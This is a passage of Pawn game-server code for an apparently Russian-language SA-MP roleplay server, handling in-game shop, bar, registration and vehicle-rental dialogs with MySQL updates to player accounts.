					ShowPlayerDialogEx(playerid, 3443, DIALOG_STYLE_INPUT, "Завершить урок по Kong Fu", "Введите [ID] обучаемого", "Завершить", "Отмена");
					return true;
				}
				else if(listitem == 5)
				{
					ShowPlayerDialogEx(playerid, 3445, DIALOG_STYLE_INPUT, "Завершить урок по Kick Box", "Введите [ID] обучаемого", "Завершить", "Отмена");
					return true;
				}
			}
			else
			{
				return true;
			}
		}
	case 3389:
		{
			if(!response) return true;
			for(new h = 1; h <= TotalBizz; h++)
			{
				if(!PlayerToPoint(3, playerid,BizzInfo[h][bBarX], BizzInfo[h][bBarY], BizzInfo[h][bBarZ]) || GetPlayerVirtualWorld(playerid) != BizzInfo[h][bVirtualWorld]) continue;
				if(strcmp(BizzInfo[h][bOwner],"None",true) == 0 || BizzInfo[h][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
				switch(listitem)
				{
				case 0,1:
					{
						if(BizzInfo[h][bProducts] < 30) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]) return SCM(playerid,COLOR_GREY," У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 30;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice];
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						BizzInfo[h][bProducts] -= 30;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice];
						BizzPay[h] += BizzInfo[h][bPrice];
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 2,3:
					{
						if(BizzInfo[h][bProducts] < 60) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*2) return SCM(playerid,COLOR_GREY," У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 60;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*2;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						BizzInfo[h][bProducts] -= 60;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*2;
						BizzPay[h] += BizzInfo[h][bPrice]*2;
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 4,5:
					{
						if(BizzInfo[h][bProducts] < 90) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*3) return SCM(playerid,COLOR_GREY," У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 90;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*3;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						BizzInfo[h][bProducts] -= 90;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				}
				ClearAnimations(playerid);
				ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
				if(GetPlayerInterior(playerid) == 10 || GetPlayerInterior(playerid) == 4) format(YCMDstr,sizeof(YCMDstr), "Бургер\t\t\t\t[%i вирт]\nРыбный суп\t\t\t[%i вирт]\nБольшой бургер\t\t[%i вирт]\nКотлеты\t\t\t[%i вирт]\
				\nПельмени\t\t\t[%i вирт]\nГамбургер\t\t\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
				else format(YCMDstr,sizeof(YCMDstr), "Пицца маленькая\t\t[%i вирт]\nПицца с грибами\t\t[%i вирт]\nПицца с сыром\t\t[%i вирт]\nПицца большая\t\t[%i вирт]\
				\nПицца с ветчиной\t\t[%i вирт]\nПицца с куринным мясом\t[%i вирт]",BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3);
				ShowPlayerDialogEx(playerid, 3389, DIALOG_STYLE_LIST, "Меню", YCMDstr, "Выбрать", "Отмена");
			}
			return true;
		}
	case 5589:
		{
			if(!response) return true;
			for(new h = 1; h <= TotalBizz; h++)
			{
				if(!PlayerToPoint(3, playerid,BizzInfo[h][bBarX], BizzInfo[h][bBarY], BizzInfo[h][bBarZ]) || GetPlayerVirtualWorld(playerid) != BizzInfo[h][bVirtualWorld]) continue;
				if(strcmp(BizzInfo[h][bOwner],"None",true) == 0 || BizzInfo[h][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
				switch(listitem)
				{
				case 0:
					{
						if(BizzInfo[h][bProducts] < 10) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice];
						BizzPay[h] += BizzInfo[h][bPrice];
						BizzInfo[h][bProducts] -= 10;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice];
						new randphone = 100000 + random(899999);
						PlayerInfo[playerid][pPnumber] = randphone;
						SendMes(playerid,COLOR_BLUE," Ваш новый номер мобильного %i", randphone);
					}
				case 1:
					{
						if(BizzInfo[h][bProducts] < 20) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*2) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*2;
						BizzPay[h] += BizzInfo[h][bPrice]*2;
						BizzInfo[h][bProducts] -= 20;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*2;
						PlayerInfo[playerid][pDirectory] = 1;
						SCM(playerid, COLOR_BLUE, "Телефонная книга приобретена!");
						SCM(playerid, COLOR_BLUE, "(( Введите /directory - справочник, /number - узнать номер телефона игрока ))");
					}
				case 2:
					{
						if(BizzInfo[h][bProducts] < 30) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*3) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						if(HGet(playerid))
						{
							if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hHel] >= 500) return SCM(playerid,COLOR_GREY," Вы не можете хранить более 500 аптечек!");
							HouseInfo[PlayerInfo[playerid][pPHouseKey]][hHel] += 25;
							SCM(playerid, COLOR_BLUE," Вы купили в дом 25 аптечек");
						}
						else if(KGet(playerid))
						{
							if(kvartinfo[PlayerInfo[playerid][pKvartiraKey]][aptek] >= 500) return SCM(playerid,COLOR_GREY," Вы не можете хранить более 500 аптечек!");
							kvartinfo[PlayerInfo[playerid][pKvartiraKey]][aptek] += 25;
							SCM(playerid, COLOR_BLUE," Вы купили в квартиру 25 аптечек");
						}
						else return SCM(playerid,COLOR_GREY," У вас нет дома/квартиры");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						BizzInfo[h][bProducts] -= 30;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*3;
					}
				case 3:
					{
						if(BizzInfo[h][bProducts] < 30) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*3) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						BizzInfo[h][bProducts] -= 30;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*3;
						GiveWeapon(playerid, 43, 10);
						SCM(playerid, COLOR_BLUE, " Вы купили фотоаппарат");
					}
				case 4:
					{
						if(BizzInfo[h][bProducts] < 30) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*3) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						BizzInfo[h][bProducts] -= 30;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*3;
						GiveWeapon(playerid, 14, 1);
						SCM(playerid, COLOR_BLUE, " Вы купили цветы");
					}
				case 6:
					{
						if(BizzInfo[h][bProducts] < 40) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*4) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*4;
						BizzPay[h] += BizzInfo[h][bPrice]*4;
						BizzInfo[h][bProducts] -= 40;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*4;
						SetPVarInt(playerid,"fish_rod",1);
						SCM(playerid, COLOR_BLUE, " Вы купили удочку");
					}
				case 7:
					{
						if(BizzInfo[h][bProducts] < 40) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*4) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*4;
						BizzPay[h] += BizzInfo[h][bPrice]*4;
						BizzInfo[h][bProducts] -= 40;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*4;
						SetPVarInt(playerid,"fish_gear",GetPVarInt(playerid,"fish_gear")+10);
						SCM(playerid, COLOR_BLUE, " Вы купили снасти. [10 шт.]");
					}
				case 8:
					{
						if(BizzInfo[h][bProducts] < 50) return SCM(playerid, COLOR_GREY, " Нет продуктов");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*5) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*5;
						BizzPay[h] += BizzInfo[h][bPrice]*5;
						BizzInfo[h][bProducts] -= 50;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*5;
						SetPVarInt(playerid,"fish_sonar",1);
						SCM(playerid, COLOR_BLUE, " Вы купили сонар");
					}

				}
				format(string,300, "Номер телефона:\t[%i вирт]\nСправочник:\t\t[%i вирт]\nАптечки(25шт.):\t\t[%i вирт]\nФотоаппарат:\t\t[%i вирт]\nЦветы:\t\t\t[%i вирт]\nУдочка:\t\t[%i вирт]\nСнасти(10шт.):\t\t[%i вирт]\nСонар:\t\t\t[%i вирт]",BizzInfo[h][bPrice],
				BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*4,BizzInfo[h][bPrice]*4,BizzInfo[h][bPrice]*5);
				ShowPlayerDialogEx(playerid, 5589, DIALOG_STYLE_LIST, "24/7", string, "Купить", "Отмена");
			}
			return true;
		}
	case 2289:
		{
			if(!response) return true;
			for(new h = 1; h <= TotalBizz; h++)
			{
				if(!PlayerToPoint(3, playerid,BizzInfo[h][bBarX], BizzInfo[h][bBarY], BizzInfo[h][bBarZ]) || GetPlayerVirtualWorld(playerid) != BizzInfo[h][bVirtualWorld]) continue;
				if(strcmp(BizzInfo[h][bOwner],"None",true) == 0 || BizzInfo[h][bLocked]) return SCM(playerid, COLOR_GREY, " Бизнес закрыт");
				switch(listitem)
				{
				case 0..2:
					{
						if(BizzInfo[h][bProducts] < 10) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 30;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice];
						BizzPay[h] += BizzInfo[h][bPrice];
						BizzInfo[h][bProducts] -= 10;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice];
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 3..4:
					{
						if(BizzInfo[h][bProducts] < 20) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*2) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 30;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*2;
						BizzPay[h] += BizzInfo[h][bPrice]*2;
						BizzInfo[h][bProducts] -= 20;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*2;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 5..6:
					{
						if(BizzInfo[h][bProducts] < 30) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*3) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 60;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*3;
						BizzPay[h] += BizzInfo[h][bPrice]*3;
						BizzInfo[h][bProducts] -= 30;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*3;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 7:
					{
						if(BizzInfo[h][bProducts] < 40) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*4) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 60;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*4;
						BizzPay[h] += BizzInfo[h][bPrice]*4;
						BizzInfo[h][bProducts] -= 40;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*4;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 8..9:
					{
						if(BizzInfo[h][bProducts] < 50) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*5) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 90;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*5;
						BizzPay[h] += BizzInfo[h][bPrice]*5;
						BizzInfo[h][bProducts] -= 50;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*5;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				case 10:
					{
						if(BizzInfo[h][bProducts] < 60) return SCM(playerid, COLOR_GREY, " В баре нет напитков");
						if(PlayerInfo[playerid][pCash] < BizzInfo[h][bPrice]*6) return SCM(playerid, COLOR_GREY, " У вас нет столько денег");
						PlayerInfo[playerid][pSatiety] += 90;
						BizzInfo[h][bTill] += BizzInfo[h][bPrice]*6;
						BizzPay[h] += BizzInfo[h][bPrice]*6;
						BizzInfo[h][bProducts] -= 60;
						PlayerInfo[playerid][pCash] -= BizzInfo[h][bPrice]*6;
						if(PlayerInfo[playerid][pSatiety] > 100) PlayerInfo[playerid][pSatiety] = 100;
						SendMes(playerid,-1," «Сытость» пополнена до %i",PlayerInfo[playerid][pSatiety]);
						ClearAnimations(playerid);
						ApplyAnimation(playerid, "BAR", "dnk_stndF_loop",4.1,0,0,0,0,0,1);
						mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pSatiety = '%i', pCash = '%i' WHERE name = '%e'", PlayerInfo[playerid][pSatiety], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
                        mysql_function_query(DATABASE,QUERY,false,"","");
					}
				}
				format(YCMDstr,sizeof(YCMDstr), "Вода\t\t[%i вирт]\nСода\t\t[%i вирт]\nТоник\t\t[%i вирт]\nКока-кола\t[%i вирт]\nПиво\t\t[%i вирт]\nСаке\t\t[%i вирт]\nВодка\t\t[%i вирт]\nВино\t\t[%i вирт]\nВиски\t\t[%i вирт]\nКоньяк\t\t[%i вирт]\nАбсент\t\t[%i вирт]",
				BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice],BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*2,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*3,BizzInfo[h][bPrice]*4,BizzInfo[h][bPrice]*5,BizzInfo[h][bPrice]*5,BizzInfo[h][bPrice]*6);
				ShowPlayerDialogEx(playerid, 2289, DIALOG_STYLE_LIST, "Меню Бара", YCMDstr, "Выбрать", "Отмена");
			}
			return true;
		}
	case 2626:
		{
			if(response)
			{
			    if(!strlen(inputtext))
				{
     				format(string,527, "{FFFFFF}Введите ваш настоящую электронную почту для безопастности\n{FFA500}Для чего нужна электронная почта?\n\n{FFA500}- {FFFFFF}Для подтверждения вашего личного аккаунта\n{FFA500}- {FFFFFF}Для повышения безопастности вашего аккаунта\n{FFA500}- {FFFFFF}Для восстоновления вашего пароля от аккаунта", PlayerInfo[playerid][pName]);
					ShowPlayerDialogEx(playerid,2626,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Электронная почта",string, "Далее", "Пропустить");
					return true;
				}
				for(new i = strlen(inputtext); i != 0; --i)
				switch(inputtext[i])
				{
					case 'А'..'Я', 'а'..'я', ' ':
					{
						return ShowPlayerDialogEx(playerid,2626,DIALOG_STYLE_MSGBOX, "{FF6347}Ошибка", "{FFFFFF}Электронная почта должна состоять из латинских символов или цифр", "Повторить", "");
					}
				}
				if(!IsValidEmail(inputtext))
				{
				    return ShowPlayerDialogEx(playerid,2626,DIALOG_STYLE_MSGBOX, "{FF6347}Ошибка", "{FFFFFF}Введите правильно вашу электронную почту", "Повторить", "");
				}
				strmid(PlayerInfo[playerid][pEmail], inputtext, 0, strlen(inputtext), strlen(inputtext)+5);
			    ShowPlayerDialogEx(playerid,2625,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Реферальная система", "{FFFFFF}Введите ник пригласившиго вас на сервер, пригласивший вас человек получит от вас 100.000$", "Далее", "Пропуск");
			}
			else
			{
			    ShowPlayerDialogEx(playerid,2625,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Реферальная система", "{FFFFFF}Введите ник пригласившиго вас на сервер, пригласивший вас человек получит от вас 100.000$", "Далее", "Пропуск");
			}
		}
	case 2625:
		{
			if(response)
			{
				if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid,2625,DIALOG_STYLE_INPUT, "{AE443D}Регистрация | {FFFFFF}Реферальная система", "{FFFFFF}Введите ник пригласившиго вас на сервер, пригласивший вас человек получит от вас 100.000$", "Далее", "Пропуск");
				mysql_format(DATABASE, QUERY, 128,"SELECT `Name` FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",inputtext);
				mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",3,playerid,inputtext);
			}
			else strmid(PlayerInfo[playerid][pDrug], "-", 0, strlen("-"), strlen("-")+5);
			ShowPlayerDialogEx(playerid,4,DIALOG_STYLE_MSGBOX, "{AE443D}Регистрация | {FFFFFF}Выбор пола", "{FFFFFF}Выберите пол для вашего персонажа:\n", "Мужчина", "Женщина");
			TogglePlayerControllable(playerid, 0);
			SetSpawnInfo(playerid, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
		}
	case 9125:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pCash] <= 9000)
				{
					SCM(playerid, COLOR_GRAD2, " У вас нет столько денег!");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
					return true;
				}
				PlayerInfo[playerid][pCash] -= 10000;
				arenda[playerid] = GetPlayerVehicleID(playerid);
				TogglePlayerControllable(playerid, 1);
				GameTextForPlayer(playerid,"~w~YOU HAVE HIRED THE CAR~n~GOOD LUCK ON ROAD", 5000, 3);
				SCM(playerid, -1, " Вы арендовали транспортное средство");
				return true;
			}
			else
			{
				RemovePlayerFromVehicleAC(playerid);
				TogglePlayerControllable(playerid, 1);
				return true;
			}
		}
	case 9126:
		{
			if(response)
			{
				if(PlayerInfo[playerid][pCash] <= 1500)
				{
					SCM(playerid, COLOR_GRAD2, " У вас нет столько денег!");
					RemovePlayerFromVehicleAC(playerid);
					TogglePlayerControllable(playerid, 1);
					return true;
				}
				PlayerInfo[playerid][pCash] -= 1500;
				arenda[playerid] = GetPlayerVehicleID(playerid);
				TogglePlayerControllable(playerid, 1);
				GameTextForPlayer(playerid,"~w~YOU HAVE HIRED THE CAR~n~GOOD LUCK ON ROAD", 5000, 3);
				SCM(playerid, -1, " Вы арендовали транспортное средство");
				return true;
			}
			else
			{
				RemovePlayerFromVehicleAC(playerid);
				TogglePlayerControllable(playerid, 1);
				return true;
			}
		}
	case 8128:
		{
			if(!response) return true;
			if(GetPVarInt(playerid,"BusRepairMoney") > GetPVarInt(playerid, "BusMoney")) SetPVarInt(playerid,"BusRepairMoney",PlayerInfo[playerid][pPayCheck]);
			format(YCMDstr, sizeof(YCMDstr), " Вы закончили свой рабочий день. Заработано $%i. За ремонт -$%i", GetPVarInt(playerid, "BusMoney"), GetPVarInt(playerid,"BusRepairMoney"));
			SCM(playerid, 0x26bf99aa, YCMDstr);
			SCM(playerid, -1, " Деньги будут перечислены на ваш счёт во время зарплаты");
			PlayerInfo[playerid][pPayCheck] -= GetPVarInt(playerid,"BusRepairMoney");
			DeletePVar(playerid, "BusTime");
			DeletePVar(playerid, "TypeBus");
			DeletePVar(playerid, "BusStop");
			DeletePVar(playerid, "BusMoney");
			DeletePVar(playerid, "BusRepairMoney");
			DeletePVar(playerid, "BusMoney");
			DeletePVar(playerid, "rentcar_job");
			pPressed[playerid] = 0;
			Delete3DTextLabel(JobText3D[GetPlayerVehicleID(playerid)]);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerRaceCheckpoint(playerid);
			return true;
		}
	case 9128:
		{
			if(!response) return RemovePlayerFromVehicleAC(playerid), TogglePlayerControllable(playerid, 1);
			if(PlayerInfo[playerid][pCash] < 500) return SCM(playerid, COLOR_GRAD2, " У вас нет столько денег!"), RemovePlayerFromVehicleAC(playerid), TogglePlayerControllable(playerid, 1);
			PlayerInfo[playerid][pCash]-=500;
			new carr = GetPlayerVehicleID(playerid);
			SetPVarInt(playerid,"rentcar_job",GetPlayerVehicleID(playerid));
			TogglePlayerControllable(playerid, 1);
			GameTextForPlayer(playerid, "~r~-$500", 5000, 1);
			GameTextForPlayer(playerid,"~w~YOU HAVE HIRED THE CAR~n~GOOD LUCK ON ROAD", 5000, 3);
			if(GetPlayerVehicleID(playerid) >= comptruck[0] && GetPlayerVehicleID(playerid) <= comptruck[1])
			{
				SendMes(playerid,TEAM_GROVE_COLOR," Зерна в машине: %i / 1000",car_grain[GetPlayerVehicleID(playerid)][0]);
				SendMes(playerid,TEAM_GROVE_COLOR," Урожая в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][0]);
				SendMes(playerid,TEAM_GROVE_COLOR," Наркотиков в машине: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
				SCM(playerid,-1," (( Команды: /prodmenu ))");
				SCM(playerid,-1," (( Чтобы закрыть машину, введите /plock ))");
			}
			else if(GetPlayerVehicleID(playerid) >= comptruck[2] && GetPlayerVehicleID(playerid) <= comptruck[3])
			{
				SendMes(playerid,TEAM_GROVE_COLOR," Топливо: %i / 1000",car_prods[GetPlayerVehicleID(playerid)][1]);
				SCM(playerid,-1," (( Команды: /prodmenu ))");
			}
			else if(GetPlayerVehicleID(playerid) >= comptruck[4] && GetPlayerVehicleID(playerid) <= comptruck[5])
			{
				SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
				SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			}
			else if(GetPlayerVehicleID(playerid) >= comptruck[6] && GetPlayerVehicleID(playerid) <= comptruck[7])
			{
				SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
				SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			}
			else if(GetPlayerVehicleID(playerid) >= comptruck[8] && GetPlayerVehicleID(playerid) <= comptruck[9])
			{
				SendMes(playerid,TEAM_GROVE_COLOR," Товары: %i / %i",car_prods[GetPlayerVehicleID(playerid)][2],PlayerInfo[playerid][pPMGruz]);
				SendMes(playerid,TEAM_GROVE_COLOR," Еда: %i / %i",car_prods[GetPlayerVehicleID(playerid)][3],PlayerInfo[playerid][pPMGruz]);
			}
			else if(GetPlayerVehicleID(playerid) >= mehanik[0] && GetPlayerVehicleID(playerid) <= mehanik[12]) SCM(playerid,COLOR_GREEN," Вы можете чинить и заправлять машины. (( Заправка: /refill / Ремонт: /repair ))"), SCM(playerid,COLOR_GREEN," Вы должны заключить контракт с заправкой. (( Команда: /mcontract ))");
			else if(GetPlayerVehicleID(playerid) >= buscar[0] && GetPlayerVehicleID(playerid) <= buscar[5]) ShowPlayerDialogEx(playerid,1745,DIALOG_STYLE_MSGBOX," ","Начать работу водителя автобуса?", "Да", "Нет");
			else if(GetPlayerVehicleID(playerid) >= hotdogcar[0] && GetPlayerVehicleID(playerid) <= hotdogcar[1]) SCM(playerid,COLOR_GREEN," Заключите контракт с закусочной, для торговли едой. (( Подъедьте к закусочной и введите: /hcontract ))");
